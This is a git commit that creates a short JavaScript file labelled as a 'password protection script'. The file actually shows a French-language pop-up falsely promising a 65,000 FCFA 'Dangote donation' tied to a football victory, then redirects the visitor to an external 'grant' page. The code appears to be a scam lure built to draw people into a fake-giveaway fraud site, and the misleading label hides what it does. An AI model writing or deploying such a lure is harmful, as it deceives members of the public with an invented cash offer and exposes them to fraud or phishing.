67e79a5f0a1b1a95b0b624b476bb199dc6415f55
The-On-going <sirpeelawson@gmail.com>
2026-01-20 02:20:54 +0100

    Create activeb.js

---
+++ activeb.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour recevoir le DON DE 65,000 FCFA DE DANGOTE POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA. Veuillez appuyer sur OK pour recevoir instantanément.',
+  'RETIRER DE L’ARGENT'
+);
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://ongoing-grant.info/Soutien-Dangote.html';
+  }
